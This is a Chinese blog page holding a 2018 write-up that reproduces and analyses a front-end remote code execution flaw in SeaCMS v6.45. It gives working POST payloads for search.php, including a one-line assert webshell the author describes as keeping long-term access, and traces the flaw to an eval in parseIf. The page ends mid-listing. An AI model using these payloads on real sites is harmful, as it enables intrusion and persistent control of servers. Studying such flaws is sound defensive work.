<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"lyuane.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<meta name="description" content="路漫漫其修远兮,吾将上下而求索">
<meta property="og:type" content="website">
<meta property="og:title" content="沄渊">
<meta property="og:url" content="http://lyuane.github.io/page/4/index.html">
<meta property="og:site_name" content="沄渊">
<meta property="og:description" content="路漫漫其修远兮,吾将上下而求索">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="沄渊">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://lyuane.github.io/page/4/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/4/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>沄渊</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">沄渊</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">守得云开见月明</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="沄渊"
      src="/images/avatar.jpeg">
  <p class="site-author-name" itemprop="name">沄渊</p>
  <div class="site-description" itemprop="description">路漫漫其修远兮,吾将上下而求索</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://lyuane.github.io/2018/07/08/2018-07-08-SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpeg">
      <meta itemprop="name" content="沄渊">
      <meta itemprop="description" content="路漫漫其修远兮,吾将上下而求索">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="沄渊">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2018/07/08/2018-07-08-SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">SeaCMS v6.45前台Getshell 代码执行</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2018-07-08 00:00:00" itemprop="dateCreated datePublished" datetime="2018-07-08T00:00:00+08:00">2018-07-08</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这个CMS没有用框架，所以漏洞的执行过程比较复杂,跟着网上的博客做了大半天，不过从整体上来说这个CMS还是挺简单的，不过危害性很大。</p>
<h3 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h3><blockquote>
<p><strong>Web：</strong> Apache</p>
<p><strong>System：</strong> Windows 10 X64</p>
<p><strong>Browser：</strong> Firefox Quantum</p>
<p><strong>Python version ：</strong> 2.7</p>
</blockquote>
<h3 id="0x02-漏洞整体过程"><a href="#0x02-漏洞整体过程" class="headerlink" title="0x02 漏洞整体过程"></a>0x02 漏洞整体过程</h3><p>在网上找到一张图，相对简单明了一些</p>
<p><img src="https://image.mengsec.com/18-8-6/81792070.jpg" alt="img"></p>
<h3 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h3><h4 id="3-1-搭建CMS"><a href="#3-1-搭建CMS" class="headerlink" title="3.1 搭建CMS"></a>3.1 搭建CMS</h4><p>官网已经没有V6.45的版本，在别人的博客下面找到了一个百度云链接</p>
<p>地址：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw">https://pan.baidu.com/s/1uw_VnxnvG4GGEae4TRsGGw</a></p>
<p>密码：cd48</p>
<h4 id="3-2-POC"><a href="#3-2-POC" class="headerlink" title="3.2 POC"></a>3.2 POC</h4><p>第一种（验证漏洞）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/upload/search.php</span></span><br><span class="line">post:searchtype=<span class="number">5</span>&amp;order=&#125;&#123;end <span class="keyword">if</span>&#125; &#123;<span class="keyword">if</span>:<span class="number">1</span>)phpinfo();<span class="keyword">if</span>(<span class="number">1</span>&#125;&#123;end <span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure>

<p>第二种（变形的一句话木马，可长期维持权限）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/upload/search.php</span></span><br><span class="line">POST:searchtype=<span class="number">5</span>&amp;order=&#125;&#123;end <span class="keyword">if</span>&#125; &#123;<span class="keyword">if</span>:<span class="number">1</span>)print_r(<span class="variable">$_POST</span>[a](<span class="variable">$_POST</span>[b]));<span class="comment">//&#125;&#123;end if&#125;&amp;a=assert&amp;b=phpinfo();</span></span><br></pre></td></tr></table></figure>



<h4 id="3-3-验证"><a href="#3-3-验证" class="headerlink" title="3.3 验证"></a>3.3 验证</h4><p>如图，可以看到POC传入之后代码成功执行</p>
<p><img src="E:\学习记录\seacms\1.png" alt="1"></p>
<h3 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h3><p>漏洞产生的主要原因是<code>$order</code>参数没做严格的限制，就将其传入了模板文件中，然后使用<code>eval()</code>执行模板中包含<code>$order</code>的代码。</p>
<p>首先，在文件<code>seacms/search.php</code>中，包含了文件<code>seacms/include/common.php</code>,在<code>common.php</code>中第45-48行，将GET,POST等请求传入的全局变量中的键值对转换成变量，并对其中的值使用<code>addslashes()</code>进行处理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>( is_array(<span class="variable">$svar</span>) )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) <span class="variable">$svar</span>[<span class="variable">$_k</span>] = _RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$svar</span> = addslashes(<span class="variable">$svar</span>); <span class="comment"># 转义单引号、双引号、反斜线、NULL</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>) $&#123;<span class="variable">$_k</span>&#125; = _RunMagicQuotes(<span class="variable">$_v</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>seacms/search.php</code>文件的<code>echoSearchPage()</code>函数中，也就是文件第63行，将变量注册成全局变量。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">global</span> <span class="variable">$dsql</span>,<span class="variable">$cfg_iscache</span>,<span class="variable">$mainClassObj</span>,<span class="variable">$page</span>,<span class="variable">$t1</span>,<span class="variable">$cfg_search_time</span>,<span class="variable">$searchtype</span>,<span class="variable">$searchword</span>,<span class="variable">$tid</span>,<span class="variable">$year</span>,<span class="variable">$letter</span>,<span class="variable">$area</span>,<span class="variable">$yuyan</span>,<span class="variable">$state</span>,<span class="variable">$ver</span>,<span class="variable">$order</span>,<span class="variable">$jq</span>,<span class="variable">$money</span>,<span class="variable">$cfg_basehost</span>;</span><br></pre></td></tr></table></figure>

<p>可以看到，在<code>search.php</code>中，执行<code>echoSearchPage()</code>函数之前，没有对<code>$order</code>变量进行处理。</p>
<p>接着往下看，在<code>echoSearchPage()</code>函数中，使用<code>$searchtype</code>来选择使用的模板文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$searchtype</span>)==<span class="number">5</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$searchTemplatePath</span> = <span class="string">&quot;/templets/&quot;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_df_style&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_df_html&#x27;</span>].<span class="string">&quot;/cascade.html&quot;</span>;</span><br><span class="line">		<span class="variable">$typeStr</span> = !<span class="keyword">empty</span>(<span class="variable">$tid</span>)?intval(<span class="variable">$tid</span>).<span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;0_&#x27;</span>;</span><br><span class="line">		<span class="variable">$yearStr</span> = !<span class="keyword">empty</span>(<span class="variable">$year</span>)?PinYin(<span class="variable">$year</span>).<span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;0_&#x27;</span>;</span><br><span class="line">		<span class="variable">$letterStr</span> = !<span class="keyword">empty</span>(<span class="variable">$letter</span>)?<span class="variable">$letter</span>.<span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;0_&#x27;</span>;</span><br><span class="line">		<span class="variable">$areaStr</span> = !<span class="keyword">empty</span>(<span class="variable">$area</span>)?PinYin(<span class="variable">$area</span>).<span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;0_&#x27;</span>;</span><br><span class="line">		<span class="variable">$orderStr</span> = !<span class="keyword">empty</span>(<span class="variable">$order</span>)?<span class="variable">$order</span>.<span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;0_&#x27;</span>;</span><br><span class="line">		<span class="variable">$jqStr</span> = !<span class="keyword">empty</span>(<span class="variable">$jq</span>)?<span class="variable">$jq</span>.<span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;0_&#x27;</span>;</span><br><span class="line">		<span class="variable">$cacheName</span>=<span class="string">&quot;parse_cascade_&quot;</span>.<span class="variable">$typeStr</span>.<span class="variable">$yearStr</span>.<span class="variable">$letterStr</span>.<span class="variable">$areaStr</span>.<span class="variable">$orderStr</span>;</span><br><span class="line">		<span class="variable">$pSize</span> = getPageSizeOnCache(<span class="variable">$searchTemplatePath</span>,<span class="string">&quot;cascade&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$cfg_search_time</span>&amp;&amp;<span class="variable">$page</span>==<span class="number">1</span>) checkSearchTimes(<span class="variable">$cfg_search_time</span>);</span><br><span class="line">		<span class="variable">$searchTemplatePath</span> = <span class="string">&quot;/templets/&quot;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_df_style&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_df_html&#x27;</span>].<span class="string">&quot;/search.html&quot;</span>;</span><br><span class="line">		<span class="variable">$cacheName</span>=<span class="string">&quot;parse_search_&quot;</span>;</span><br><span class="line">		<span class="variable">$pSize</span> = getPageSizeOnCache(<span class="variable">$searchTemplatePath</span>,<span class="string">&quot;search&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>当值是5时，会使用<code>cascade.html</code>，文件目录为<code>seacms\templets\default\html\cascade.html</code>，若不是，则会使用<code>earch.html</code>，文件目录为<code>seacms\templets\default\html\search.html</code>。</p>
<p>下面153行，将模板文件读取到<code>$content</code>变量中，接着在155-173行替换标签。其中第158行使用<code>$order</code>替换了模板中<code>&#123;searchpage:ordername&#125;</code>标签。然后分别搜索<code>search.html</code>和<code>cascade.html</code>，只有<code>cascade.html</code>第79-81行存在该标签。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&#123;searchpage:order-time-link&#125;&quot;</span> &#123;<span class="keyword">if</span>:<span class="string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="string">&quot;time&quot;</span>&#125; <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">success</span>&quot; </span>&#123;<span class="keyword">else</span>&#125; <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">default</span>&quot; </span>&#123;end <span class="keyword">if</span>&#125; id=<span class="string">&quot;orderhits&quot;</span>&gt;最新上映&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;&#123;searchpage:order-hit-link&#125;&quot;</span> &#123;<span class="keyword">if</span>:<span class="string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="string">&quot;hit&quot;</span>&#125; <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">success</span>&quot; </span>&#123;<span class="keyword">else</span>&#125; <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">default</span>&quot; </span>&#123;end <span class="keyword">if</span>&#125; id=<span class="string">&quot;orderaddtime&quot;</span>&gt;最近热播&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;&#123;searchpage:order-score-link&#125;&quot;</span> &#123;<span class="keyword">if</span>:<span class="string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="string">&quot;score&quot;</span>&#125; <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">success</span>&quot; </span>&#123;<span class="keyword">else</span>&#125; <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">default</span>&quot; </span>&#123;end <span class="keyword">if</span>&#125; id=<span class="string">&quot;ordergold&quot;</span>&gt;评分最高&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>因此，必须要<code>$searchtype==5</code>。</p>
<p>接着往下走，在第212行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="variable">$mainClassObj</span>-&gt;parseIf(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>

<p>跟进去，在<code>seacms\include\main.class.php</code>中第3098-3147行中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseIf</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$content</span>, <span class="string">&#x27;&#123;if:&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$labelRule</span> = buildregx(<span class="string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>, <span class="string">&quot;is&quot;</span>);</span><br><span class="line">        <span class="variable">$labelRule2</span> = <span class="string">&quot;&#123;elseif&quot;</span>;</span><br><span class="line">        <span class="variable">$labelRule3</span> = <span class="string">&quot;&#123;else&#125;&quot;</span>;</span><br><span class="line">        preg_match_all(<span class="variable">$labelRule</span>, <span class="variable">$content</span>, <span class="variable">$iar</span>);</span><br><span class="line">        <span class="variable">$arlen</span> = count(<span class="variable">$iar</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="variable">$elseIfFlag</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$m</span> = <span class="number">0</span>; <span class="variable">$m</span> &lt; <span class="variable">$arlen</span>; <span class="variable">$m</span>++) &#123;</span><br><span class="line">            <span class="variable">$strIf</span> = <span class="variable">$iar</span>[<span class="number">1</span>][<span class="variable">$m</span>];</span><br><span class="line">            <span class="variable">$strIf</span> = <span class="keyword">$this</span>-&gt;parseStrIf(<span class="variable">$strIf</span>);</span><br><span class="line">            <span class="variable">$strThen</span> = <span class="variable">$iar</span>[<span class="number">2</span>][<span class="variable">$m</span>];</span><br><span class="line">            <span class="variable">$strThen</span> = <span class="keyword">$this</span>-&gt;parseSubIf(<span class="variable">$strThen</span>);</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$strThen</span>, <span class="variable">$labelRule2</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (strpos(<span class="variable">$strThen</span>, <span class="variable">$labelRule3</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$elsearray</span> = explode(<span class="variable">$labelRule3</span>, <span class="variable">$strThen</span>);</span><br><span class="line">                    <span class="variable">$strThen1</span> = <span class="variable">$elsearray</span>[<span class="number">0</span>];</span><br><span class="line">                    <span class="variable">$strElse1</span> = <span class="variable">$elsearray</span>[<span class="number">1</span>];</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="string">&quot;if(&quot;</span> . <span class="variable">$strIf</span> . <span class="string">&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$ifFlag</span>) &#123;</span><br><span class="line">                        <span class="variable">$content</span> = str_replace(<span class="variable">$iar</span>[<span class="number">0</span>][<span class="variable">$m</span>], <span class="variable">$strThen1</span>, <span class="variable">$content</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$content</span> = str_replace(<span class="variable">$iar</span>[<span class="number">0</span>][<span class="variable">$m</span>], <span class="variable">$strElse1</span>, <span class="variable">$content</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="string">&quot;if(&quot;</span> . <span class="variable">$strIf</span> . <span class="string">&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$ifFlag</span>) &#123;</span><br><span class="line">                        <span class="variable">$content</span> = str_replace(<span class="variable">$iar</span>[<span class="number">0</span>][<span class="variable">$m</span>], <span class="variable">$strThen</span>, <span class="variable">$content</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$content</span> = str_replace(<span class="variable">$iar</span>[<span class="number">0</span>][<span class="variable">$m</span>], <span class="string">&quot;&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$elseIfArray</span> = explode(<span class="variable">$labelRule2</span>, <span class="variable">$strThen</span>);</span><br><span class="line">                <span class="variable">$elseIfArrayLen</span> = count(<span class="variable">$elseIfArray</span>);</span><br><span class="line">                <span class="variable">$elseIfSubArray</span> = explode(<span class="variable">$labelRule3</span>, <span class="variable">$elseIfArray</span>[<span class="variable">$elseIfArrayLen</span> - <span class="number">1</span>]);</span><br><span class="line">                <span class="variable">$resultStr</span> = <span class="variable">$elseIfSubArray</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="variable">$elseIfArraystr0</span> = addslashes(<span class="variable">$elseIfArray</span>[<span class="number">0</span>]);</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="string">&quot;if(<span class="subst">&#123;$strIf&#125;</span>)&#123;\$resultStr=\&quot;<span class="subst">&#123;$elseIfArraystr0&#125;</span>\&quot;;&#125;&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="variable">$elseIfLen</span> = <span class="number">1</span>; <span class="variable">$elseIfLen</span> &lt; <span class="variable">$elseIfArrayLen</span>; <span class="variable">$elseIfLen</span>++) &#123;</span><br><span class="line">                    <span class="variable">$strElseIf</span> = getSubStrByFromAndEnd(<span class="variable">$elseIfArray</span>[<span class="variable">$elseIfLen</span>], <span class="string">&quot;:&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    <span class="variable">$strElseIf</span> = <span class="keyword">$this</span>-&gt;parseStrIf(<span class="variable">$strElseIf</span>);</span><br><span class="line">                    <span class="variable">$strElseIfThen</span> = addslashes(getSubStrByFromAndEnd(<span class="variable">$elseIfArray</span>[<span class="variable">$elseIfLen</span>], <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;start&quot;</span>));</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="string">&quot;if(&quot;</span> . <span class="variable">$strElseIf</span> . <span class="string">&quot;)&#123;\$resultStr=\&quot;<span class="subst">&#123;$strElseIfThen&#125;</span>\&quot;;&#125;&quot;</span>);</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="string">&quot;if(&quot;</span> . <span class="variable">$strElseIf</span> . <span class="string">&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$elseIfFlag</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$strElseIf0</span> = getSubStrByFromAndEnd(<span class="variable">$elseIfSubArray</span>[<span class="number">0</span>], <span class="string">&quot;:&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                <span class="variable">$strElseIfThen0</span> = addslashes(getSubStrByFromAndEnd(<span class="variable">$elseIfSubArray</span>[<span class="number">0</span>], <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;start&quot;</span>));</span><br><span class="line">                <span class="keyword">if</span> (strpos(<span class="variable">$strElseIf0</span>, <span class="string">&#x27;==&#x27;</span>) === <span class="literal">false</span> &amp;&amp; strpos(<span class="variable">$strElseIf0</span>, <span class="string">&#x27;=&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$strElseIf0</span> = 